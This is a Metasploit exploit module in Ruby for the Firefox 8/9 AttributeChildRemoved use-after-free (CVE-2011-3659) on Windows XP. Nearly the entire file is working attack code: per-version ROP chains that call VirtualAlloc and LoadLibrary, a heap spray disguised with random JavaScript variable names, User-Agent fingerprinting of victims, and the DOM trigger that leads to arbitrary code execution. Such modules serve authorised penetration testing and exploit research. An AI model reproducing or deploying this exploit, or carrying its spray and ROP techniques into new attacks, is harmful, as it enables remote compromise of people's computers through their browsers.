##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Firefox 8/9 AttributeChildRemoved() Use-After-Free',
			'Description'    => %q{
				This module exploits a use-after-free vulnerability in Firefox 8/8.0.1 and 9/9.0.1.
				Removal of child nodes from the nsDOMAttribute can allow for a child
				to still be accessible after removal due to a premature notification
				of AttributeChildRemoved. Since mFirstChild is not set to NULL until
				after this call is made, this means the removed child will be accessible
				after it has been removed. By carefully manipulating the memory layout,
				this can lead to arbitrary code execution.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'regenrecht',                          #vulnerability discovery
					'Lincoln<lincoln[at]corelan.be>',      #Metasploit module
					'corelanc0d3r<peter.ve[at]corelan.be>' #Metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2011-3659' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/upcoming/'], #ZDI-CAN-1413
					[ 'URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=708198' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Payload'        =>
				{
					'BadChars'       => "\x00\x0a\x0d\x34",
					'DisableNops'    => true,
					'PrependEncoder' => "\x81\xc4\x24\xfa\xff\xff"  #ADD ESP, -5DC
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', {} ],
					[
						'Windows XP - Firefox 8 / 8.0.1',
						{
							'Ret'		=> 0x0C0C0C0C,
							'OffSet'	=> 0x606,
							'Size'		=> 0x40000,
							'StackFlip'	=> 0x7818f50b, # XCHG EAX,ESP # POP EBP # POP EBX # RETN [MOZCRT19.dll]
							'PopEsp'	=> [ 0x0c0c0c0c, 0x0c0c0c0c, 0x7819548e, 0x0c0c0c10 ],
							'FF'		=> 8,
							'OS'		=> 'XP'
						}
					],
					[
						'Windows XP - Firefox 9',
						{
							'Ret'		=> 0x0C0C0C0C,
							'OffSet'	=> 0x606,
							'Size'		=> 0x40000,
							'StackFlip'	=> 0x1000ed58, # XCHG EAX,ESP # ... # POP ESI # RETN [nspr4.dll]		 
							'PopEsp'	=> [ 0x0c0c0c0c, 0x10006a01, 0x0c0c0c10 ], # POP ESP # RETN [nspr4.dll]	
							'FF'		=> 9,
							'OS'		=> 'XP'
						}
					],
					[
						'Windows XP - Firefox 9.0.1',
						{
							'Ret'		=> 0x0C0C0C0C,
							'OffSet'	=> 0x606,
							'Size'		=> 0x40000,
							'StackFlip'	=> 0x1000ed4a, # XCHG EAX,ESP # ... # POP ESI # RETN [nspr4.dll]		 
							'PopEsp'	=> [ 0x0c0c0c0c, 0x10006a11, 0x0c0c0c10 ], # POP ESP # RETN [nspr4.dll]
							'FF'		=> 901,
							'OS'		=> 'XP'
						}
					]
				],
			'DisclosureDate' => 'Dec 6 2011',
			'DefaultTarget'  => 0))

	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def junk(n=4)
		return rand_text_alpha_upper(n).unpack("L")[0].to_i
	end

	def nop
		return make_nops(4).unpack("L")[0].to_i
	end

	def get_rop_chain(ffversion,osversion)

		# mona.py ROP chains

		rop_chain = []

		if ffversion == 8 and osversion == "XP"

			rop_chain =
			[
				0x7819c80a,     # POP EAX # RETN [MOZCRT19.dll] 
				0x781a909c,     # ptr to &VirtualAlloc() [IAT MOZCRT19.dll]
				0x7813af5d,     # MOV EAX,DWORD PTR DS:[EAX] # RETN [MOZCRT19.dll]
				0x78197f06,     # XCHG EAX,ESI # RETN [MOZCRT19.dll]
				0x7814eef1,     # POP EBP # RETN [MOZCRT19.dll]
				0x781503c3,     # & call esp [MOZCRT19.dll]
				0x781391d0,     # POP EBX # RETN [MOZCRT19.dll]
				0x00000001,     # 0x00000001-> ebx
				0x781a147c,     # POP EDX # RETN [MOZCRT19.dll]
				0x00001000,     # 0x00001000-> edx
				0x7819728e,     # POP ECX # RETN [MOZCRT19.dll]
				0x00000040,     # 0x00000040-> ecx
				0x781945b5,     # POP EDI # RETN [MOZCRT19.dll]
				0x78152809,     # RETN (ROP NOP) [MOZCRT19.dll]
				0x7819ce58,     # POP EAX # RETN [MOZCRT19.dll]
				nop,            # nop
				0x7813d6b7,     # PUSHAD # RETN [MOZCRT19.dll]
			].flatten.pack("V*")

		elsif ffversion == 9 and osversion == "XP"

			rop_chain =
			[
				0x10019ee9,	# POP ECX # RETN [nspr4.dll]
				0x10020060,	# ptr to &LoadLibraryW() [IAT nspr4.dll]
				0x1000f994,	# MOV EAX,DWORD PTR DS:[ECX] # RETN [nspr4.dll]
				0x10012ad0,	# POP EBX # RETN [nspr4.dll]
				0x00000000,	# clear ebx
				0x10006f41,	# ADD EBX,EAX # XOR EAX,EAX # RETN
				0x1000cf40,	# POP EDX # RETN 00 [nspr4.dll]
				0x1000d6ce,	# RETN (ROP NOP) [nspr4.dll]
				0x10019ee9,	# POP ECX # RETN [nspr4.dll]
				0x0c0c0c50,	# xul.dll (Unicode string)
				0x1000eeb4,	# POP EDI # RETN [nspr4.dll]
				0x1001f145,	# ADD ESP,0C # RETN [nspr4.dll] - call LoadLibrary
				0x10004860,	# POP EAX # RETN [nspr4.dll]
				0x1001f111,	# ADD ESP,10 # POP ESI # RETN [nspr4.dll]
				0x100058B3,	# PUSHAD # CALL EAX [nspr4.dll]
				junk,		# win some, lose some
				0x00750078,	# xu
				0x002e006c,	# l.
				0x006c0064,	# dl
				0x0000006c,	# l
				0x1000cf40,	# POP EDX # RETN 00 [nspr4.dll]
				0x00A63374,	# Delta to IAT VirtualAlloc()
				0x10018ada,	# ADD EAX,EDX # RETN [nspr4.dll]
				0x10008ddf,	# MOV EAX,DWORD PTR DS:[EAX] # RETN    ** [nspr4.dll]
				0x1000a031,     # POP ESI # RETN    ** [nspr4.dll]
				0x1000a031,     # POP ESI # RETN    ** [nspr4.dll] (readable address)
				0x10013f1f,	# XCHG EAX,ESI # ADD DL,BYTE PTR DS:[EAX] # RETN [nspr4.dll]
				0x1000687b,	# POP EBP # RETN [nspr4.dll]
				0x1001a59b,	# & call esp [nspr4.dll]
				0x10012ad0,	# POP EBX # RETN [nspr4.dll]
				0x00000001,	# 0x00000001-> ebx
				0x1000cf40,	# POP EDX # RETN 00 [nspr4.dll]
				0x00001000,	# 0x00001000-> edx
				0x1001069e,	# POP ECX # RETN [nspr4.dll]
				0x00000040,	# 0x00000040-> ecx
				0x1000eeb4,	# POP EDI # RETN [nspr4.dll]
				0x1000d6ce,	# RETN (ROP NOP) [nspr4.dll]
				0x10004860,	# POP EAX # RETN [nspr4.dll]
				0x10004860,	# POP EAX # RETN [nspr4.dll]
				0x100058B3,	# PUSHAD # CALL EAX [nspr4.dll]
			].flatten.pack("V*")


		elsif ffversion == 901 and osversion == "XP"

			rop_chain =
			[
				0x1000bfc1,	# POP ECX # RETN [nspr4.dll]
				0x10020060,	# ptr to &LoadLibraryW() [IAT nspr4.dll]
				0x1000f986,	# MOV EAX,DWORD PTR DS:[ECX] # RETN [nspr4.dll]
				0x1000f5ef,	# POP EBX # RETN [nspr4.dll]
				0x00000000,	# clear ebx
				0x10006f51,	# ADD EBX,EAX # XOR EAX,EAX # RETN
				0x1000cf2c,	# POP EDX # RETN 00 [nspr4.dll]
				0x1001ea03,	# RETN (ROP NOP) [nspr4.dll]
				0x1000bfc1,	# POP ECX # RETN [nspr4.dll]
				0x0c0c0c50,	# xul.dll (Unicode string)
				0x1000eea6,	# POP EDI # RETN [nspr4.dll]
				0x1000dda4,	# ADD ESP,0C # RETN [nspr4.dll] - call LoadLibrary
				0x10004870,	# POP EAX # RETN [nspr4.dll]
				0x10001ab4,	# ADD ESP,10 # POP ESI # RETN [nspr4.dll]
				0x100058c3,	# PUSHAD # CALL EAX [nspr4.dll]
				junk,		# win some, lose some
				0x00750078,	# xu
				0x002e006c,	# l.
				0x006c0064,	# dl
				0x0000006c,	# l
				0x1000cf2c,	# POP EDX # RETN 00 [nspr4.dll]
				0x00A63374,	# Delta to IAT VirtualAlloc()
				0x10018acf,	# ADD EAX,EDX # RETN [nspr4.dll]
				0x10008dd1,	# MOV EAX,DWORD PTR DS:[EAX] # RETN    ** [nspr4.dll]
				0x1000e0b8,	# POP ESI # RETN    ** [nspr4.dll]
				0x1000e0b8,	# POP ESI # RETN    ** [nspr4.dll] (readable address)
				0x10013f14,	# XCHG EAX,ESI # ADD DL,BYTE PTR DS:[EAX] # RETN [nspr4.dll]
				0x100162d5,	# POP EBP # RETN [nspr4.dll]
				0x10019d12,	# & push esp #  ret  [nspr4.dll]
				0x1000f5ef,	# POP EBX # RETN [nspr4.dll]
				0x00000001,	# 0x00000001-> ebx
				0x1000cf2c,	# POP EDX # RETN 00 [nspr4.dll]
				0x00001000,	# 0x00001000-> edx
				0x10007e46,	# POP ECX # RETN [nspr4.dll]
				0x00000040,	# 0x00000040-> ecx
				0x1000eea6,	# POP EDI # RETN [nspr4.dll]
				0x1001ea03,	# RETN (ROP NOP) [nspr4.dll]
				0x10004870,	# POP EAX # RETN [nspr4.dll]
				0x10004870,	# POP EAX # RETN [nspr4.dll]
				0x100058c3,	# PUSHAD # CALL EAX [nspr4.dll]
			].flatten.pack("V*")


		end

		return rop_chain
	end


	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# determine the target FF and OS version

		ffversion = ""
		osversion = ""

		agent = request.headers['User-Agent']

		if agent !~ /Firefox\/8\.0/ and agent !~ /Firefox\/9\.0/
			vprint_error("This browser version is not supported: #{agent.to_s}")
			send_not_found(cli)
			return
		end

		my_target = target
		if my_target.name == 'Automatic'
			if agent =~ /NT 5\.1/ and agent =~ /Firefox\/8/
				my_target = targets[1]
			elsif agent =~ /NT 5\.1/ and agent =~ /Firefox\/9\.0\.1/
				my_target = targets[3]
			elsif agent =~ /NT 5\.1/ and agent =~ /Firefox\/9\.0/
				my_target = targets[2]
			elsif vprint_error("This Operating System is not supported: #{agent.to_s}")
				send_not_found(cli)
				return
			end
			target = my_target
		end

		# Create the payload
		print_status("Creating payload for #{target.name}")

		rop = [ target['StackFlip'] ].pack("V")
		rop << get_rop_chain(target['FF'],target['OS'])
		rop_js = Rex::Text.to_unescape(rop, Rex::Arch.endian(target.arch))

		code = payload.encoded
		code_js = Rex::Text.to_unescape(code, Rex::Arch.endian(target.arch))

		popesp = target['PopEsp'].flatten.pack("V*")
		popesp_js = Rex::Text.to_unescape(popesp, Rex::Arch.endian(target.arch))

		filler = [ junk ].pack("V*")
		filler_js = Rex::Text.to_unescape(filler, Rex::Arch.endian(target.arch))

		# random JavaScript variable names
		i_name                  = rand_text_alpha(rand(10) + 5)
		rop_name                = rand_text_alpha(rand(10) + 5)
		code_name               = rand_text_alpha(rand(10) + 5)
		offset_length_name      = rand_text_alpha(rand(10) + 5)
		randnum1_name           = rand_text_alpha(rand(10) + 5)
		randnum2_name           = rand_text_alpha(rand(10) + 5)
		randnum3_name           = rand_text_alpha(rand(10) + 5)
		randnum4_name           = rand_text_alpha(rand(10) + 5)
		paddingstr_name         = rand_text_alpha(rand(10) + 5)
		padding_name            = rand_text_alpha(rand(10) + 5)
		junk_offset_name        = rand_text_alpha(rand(10) + 5)
		single_sprayblock_name  = rand_text_alpha(rand(10) + 5)
		sprayblock_name         = rand_text_alpha(rand(10) + 5)
		varname_name            = rand_text_alpha(rand(10) + 5)
		thisvarname_name        = rand_text_alpha(rand(10) + 5)
		attr_name               = rand_text_alpha(rand(10) + 5)
		foo_name                = rand_text_alpha(rand(10) + 5)
		bar_name                = rand_text_alpha(rand(10) + 5)
		ni_name                 = rand_text_alpha(rand(10) + 5)
		small_name              = rand_text_alpha(rand(10) + 5)
		addr_name               = rand_text_alpha(rand(10) + 5)
		run_name                = rand_text_alpha(rand(10) + 5)
		container_name          = rand_text_alpha(rand(10) + 5)

		# corelan precise heap spray:
		# https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/
		# + trigger routine
		spray = <<-JS

		var #{rop_name} = unescape("#{rop_js}");
		var #{code_name} = unescape("#{code_js}");
		var #{offset_length_name} = #{target['OffSet']};

		for (var #{i_name}=0; #{i_name} < 0x320; #{i_name}++)
		{
			var #{randnum1_name}=Math.floor(Math.random()*90)+10;
			var #{randnum2_name}=Math.floor(Math.random()*90)+10;
			var #{randnum3_name}=Math.floor(Math.random()*90)+10;
			var #{randnum4_name}=Math.floor(Math.random()*90)+10;

			var #{paddingstr_name} = "%u" + #{randnum1_name}.toString() + #{randnum2_name}.toString();
			#{paddingstr_name} += "%u" + #{randnum3_name}.toString() + #{randnum4_name}.toString();

			var #{padding_name} = unescape(#{paddingstr_name});

			while (#{padding_name}.length < 0x1000) #{padding_name}+= #{padding_name};

			#{junk_offset_name} = #{padding_name}.substring(0, #{offset_length_name});

			var #{single_sprayblock_name} = #{junk_offset_name} + #{rop_name} + #{code_name};
			#{single_sprayblock_name} += #{padding_name}.substring(0,0x800 - #{offset_length_name} - #{rop_name}.length - #{code_name}.length);

			while (#{single_sprayblock_name}.length < #{target['Size']}) #{single_sprayblock_name} += #{single_sprayblock_name};

			#{sprayblock_name} = #{single_sprayblock_name}.substring(0, (#{target['Size']}-6)/2);

			#{varname_name} = "var" + #{randnum1_name}.toString() + #{randnum2_name}.toString();
			#{varname_name} += #{randnum3_name}.toString() + #{randnum4_name}.toString() + #{i_name}.toString();
			#{thisvarname_name} = "var " + #{varname_name} + "= '" + #{sprayblock_name} +"';";
			eval(#{thisvarname_name});
		}

		function #{run_name}() {
			var #{attr_name} = document.createAttribute("#{foo_name}");
			#{attr_name}.value = "#{bar_name}";

			var #{ni_name} = document.createNodeIterator(
 				#{attr_name}, NodeFilter.SHOW_ALL,
		 		{acceptNode: function(node) { return NodeFilter.FILTER_ACCEPT; }},
 				false);

			#{ni_name}.nextNode();
			#{ni_name}.nextNode();
			#{ni_name}.previousNode();

			#{attr_name}.value = null;
 
			const #{addr_name} = unescape("#{filler_js}");
			var #{container_name} = new Array();
			var #{small_name} = unescape("#{popesp_js}")
			while (#{small_name}.length != 30)
				#{small_name} += #{addr_name};
			for (#{i_name} = 0; #{i_name} < 1024*1024*2; ++#{i_name})
				#{container_name}.push(unescape(#{small_name}));

			#{ni_name}.referenceNode;

		}
		JS

		# build html
		content = <<-HTML
		<html>
		<head>
		<meta http-equiv="refresh" content="3">
		<body>
		<script language='javascript'>
		#{spray}
		</script>
		</head>
		<body onload="#{run_name}();">
		</svg>
		</body>
		</html>
		HTML

		print_status("Returning HTML")

		# Transmit the response to the client
		send_response(cli, content, {'Content-Type'=>'text/html'})

	end

end

